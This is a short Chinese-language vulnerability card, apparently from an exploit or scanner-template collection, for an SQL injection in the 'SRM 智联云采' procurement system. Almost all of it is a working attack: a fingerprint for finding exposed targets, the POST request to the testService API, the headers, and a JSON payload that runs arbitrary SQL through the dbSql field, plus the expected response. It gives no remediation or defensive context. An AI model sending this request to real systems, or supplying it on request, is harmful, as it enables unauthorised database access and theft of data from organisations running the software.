# SRM智联云采系统testservicesql注入漏洞

- **系统**：SRM　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="assets/js/jweixin"`
- **请求**：`POST /adpweb/a/ica/api/testService HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Length: 368`　`Content-Type: application/json`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
{"dbId": "1001", "dbSql": "#set ($lang = $lang) \n SELECT name FROM v$database", "responeTemplate": "{\n    \"std_data\": {\n        \"execution\": {\n            \"sqlcode\": \"$execution.sqlcode\",\n            \"description\": \"$execution.description\"\n        }\n}", "serviceCode": "test", "serviceName": "test", "serviceParams": "{\n    \"lang\": \"zh_CN\"\n}"}
```
- **预期**：200　|　description